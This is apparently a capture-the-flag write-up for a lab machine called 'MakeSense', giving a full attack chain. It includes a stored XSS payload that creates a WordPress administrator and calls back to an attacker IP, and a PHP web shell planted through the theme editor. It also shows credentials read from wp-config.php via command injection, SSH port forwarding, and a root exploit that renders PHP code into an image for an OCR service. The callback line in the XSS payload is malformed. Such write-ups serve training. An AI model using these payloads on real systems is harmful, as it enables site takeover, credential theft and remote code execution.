# MakeSense

## Reconnaissance
After doing directory discovery with dirsearch, we find

```
https://makesense.htb/wp-content/uploads/2026/01/voice-message.wav
```
Which provides us with creds to the wordpress instance
```
jake:ClearLightNiceSmooth4923
```
which wasn't needed, cause we could create a user with admin privileges by using stored xss, which is triggered by the Admin Bot.
```
</div></td></tr></tbody><script>
fetch('/wp-admin/user-new.php', {credentials: 'include'})
  .then(r => r.text())
  .then(h => {
    let n = (h.match(/name="_wpnonce_create-user"[^>]*value="([a-f0-9]+)"/)||[h.match(/id="_wpnonce_create-user"[^>]*value="([a-f0-9]+)"/),])[1];
    
    let p = new URLSearchParams();
    p.set('action', 'createuser');
    p.set('_wpnonce_create-user', n);
    p.set('_wp_http_referer', '/wp-admin/user-new.php');
    p.set('user_login', 'admin2');
    p.set('email', 'admin2@htb.htb');
    p.set('pass1', 'P@$$word1234!');
    p.set('pass2', 'P@$$word1234!');
    p.set('role', 'administrator');
    p.set('createuser', 'Add New User');
    p.set('pw_weak', '1');
    
    fetch('/wp-admin/user-new.php', {
      method: 'POST',
      credentials: 'include',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body: p
    }).then(r => {
      new fetch('http://10.10.14:7070'+ r.status;)
    });
  });
</script>
```
Once done, we submit a form with our payload as the message, and the other params filed as pleased. This should create an admin user with creds
```
admin2: P@$$word1234!
```
With admin access in a wordpress instance, we can easily gain command injection by modifying
- A theme
- or a plugin

Going to Appearance > Theme Editor > Agency LLC and replacing the Agency LLc code with the PHP reverse shell
```
<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
```
Update and save the file

Now, at makesense.htb, we can get our command injection by passing
```
https://makesense.htb?cmd=<COMMAND>
```

With some enumeration, the wp config file is found in the base directory /var/www/html/wp-config.php, so we get it with
```
wget 'https://makesense.htb?cmd=cat%20/var/www/html/wp-config.php' --no-check-certificate -O wp-config.php
```
Which contains creds
```
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'walter' );
define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );
define( 'DB_HOST', 'localhost' );
```

## Initial Foothold

Testing these creds against ssh grants us access to the lab machine.

Probing around, we discover
```
ss -tulnpe

localhost:8001 <-- with root level access
```
Curling it from the local machine returns
```
Authentication required.
```

But we can access it with a little port forwarding

```
ssh -L 8001:localhost:8001 walter@makesense.htb
```

Now, we can open up a browser on our attacking machine and access this port on
```
localhost:8001
creds: Walter creds
```
The local service runs PHP 8.3.6 with an OCR feature powered by tesseract.

After playing around with the OCR tool, tricking it to get the root flag is fairly easy to do;

First, we create an image with our payload embedded in it using the convert command on linux
```
convert -size 900x200 xc:white -fill black \
  -font DejaVu-Sans-Mono -pointsize 30 -gravity center \
  -annotate +0+0 '<?php system("cat /root/root.txt"); ?>' payload.png
```

Next, we base64 encode our payload.png file and store it as a local variable in our shell with

```
EnPL=$(base64 -w0 payload.png)
```
Now, we can pass this as part of part of the canvas_image parameter with the command
```
curl -i -s  -c c.txt -u 'walter:JbhHDAEgXvri3!' \
  --data-urlencode "canvas_image=data:image/png;base64,$EnPL" \
  http://localhost:8001/ | grep ocr_id
```

With our ocr_id copied down, we can save our recognized file and later on read it with the command
```
curl -i -s -b c.txt -u 'walter:JbhHDAEgXvri3!' \
  -d 'ocr_id=<REPLACE_OCR_ID>&filename=rootflag.php&save_output=Save' \
  http://localhost:8001/
```

## Getting the flags
**Root Flag**<br>
Now, reading it returns the value of /root/root.txt
```
curl -s -u 'walter:JbhHDAEgXvri3!' http://localhost:8001/saved/rootflag.php
```

**User Flag**<br>
user flag stored in
```
/home/walter/user.txt
```
